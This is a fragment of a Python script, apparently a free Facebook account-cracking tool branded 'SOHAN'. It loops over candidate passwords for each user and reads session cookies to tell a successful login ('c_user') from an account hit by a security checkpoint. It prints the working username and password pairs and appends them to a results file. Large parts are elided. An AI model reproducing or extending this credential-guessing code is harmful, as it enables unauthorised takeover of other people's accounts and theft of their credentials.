	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;37m[\033[1;32mSOHA -OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))

				wrt = '%s - %s' % (user,pw)

				ok.append(wrt)

				open('SOHAN_Ok.txt','a').write('%s\n' % wrt)

				break

			elif 'checkpoint' in ses.cookies.get_dict():

				print('\r\033[1;37m[\033[1;31mSOHAN-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
...
=================================================
    ...
    [-] VERSION   :\033[1;32m 1.2 SUPPORTED

    [-] STATUS    :\033[1;32m Free ENJOY
